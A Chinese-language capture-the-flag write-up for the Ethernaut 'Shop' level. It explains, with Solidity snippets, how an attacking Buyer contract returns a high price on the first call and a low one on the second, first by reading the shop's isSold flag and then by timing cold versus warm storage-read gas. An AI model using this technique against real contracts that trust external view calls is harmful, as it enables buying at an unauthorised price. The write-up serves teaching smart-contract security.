# Shop

## 题目描述

[原题 in Sepolia](https://ethernaut.openzeppelin.com/level/0x691eeA9286124c043B82997201E805646b76351a)

以低于要求的价格从商店买到商品.

## 运行

根据[Foundry 官方文档](https://getfoundry.sh/)配置好运行环境后，于本项目下执行下列命令：

```sh
$ cd WTF-CTF

$ forge test -C src/Ethernaut/Shop -vvvvv
```

## 功能简述

只要两次调用price的结果不同即可。view函数不能修改变量，只能读取变量。但如果某一变量进行了改变，view函数是不会检查的

```solidity
function buy() public {
	Buyer _buyer = Buyer(msg.sender);

	if (_buyer.price() >= price && !isSold) {
		isSold = true;
		price = _buyer.price();
	}
}
```

`Shop合约`的`buy函数`在两次`price()`调用中改变了`isSold`的值，所以我们可以通过`isSold`的具体值而返回不同的价格以使用更低的价格购买。

```solidity
function price() external view returns (uint256) {
	if (Shop(shop).isSold()) {
		return 0;
	} else {
		return 200;
	}
}
```

那如果将`Shop合约`的`buy函数`修改为这样，如何进行攻击？

```solidity
function buy() public {
	Buyer _buyer = Buyer(msg.sender);

	if (_buyer.price() >= price && !isSold) {
		price = _buyer.price();
		isSold = true;
		}
}
```

sload操作码会根据插槽的冷暖收取不同的gas值。

> If the accessed address is warm, the dynamic cost is 100. Otherwise the dynamic cost is 2100. See section [access sets](https://www.evm.codes/about).

如果在一次交易中读取了同一个storage变量，第二次读取时所消耗的gas费用会更低。

所以，可以在view函数中读取一个storage变量，根据gas消耗的差值来判断是否是第一次调用。

```solidity
function price() external view returns (uint256) {
	uint256 gasleftBefore = gasleft();
	justcostGas + 1;
	if (gasleftBefore - gasleft() >= 2000) {
		return 200;
	} else {
		return 0;
	}
}
```

